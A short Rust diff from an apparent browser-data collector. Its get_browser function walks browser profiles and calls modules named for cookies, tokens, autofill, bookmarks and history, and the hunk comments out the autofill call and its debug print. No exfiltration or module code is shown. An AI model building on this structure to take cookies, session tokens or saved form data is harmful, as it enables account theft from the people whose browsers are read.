@@ -22,8 +22,10 @@ pub async fn get_browser() {
         if let Ok(profiles) = get_profiles(path_entry).await {
             // cookies::get_cookies(path_entry, &profiles).await;
             // token::get_token(path_entry, &profiles).await;
-            let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
-            println!("{autofills:#?}");
+
+            // let autofills = autofill::get_autofill(path_entry, &profiles, &tempfile).await;
+            // println!("{autofills:#?}");
+
             // bookmarks::get_bookmarks(path_entry, &profiles).await;
             // history::get_history(path_entry, &profiles).await;
         }
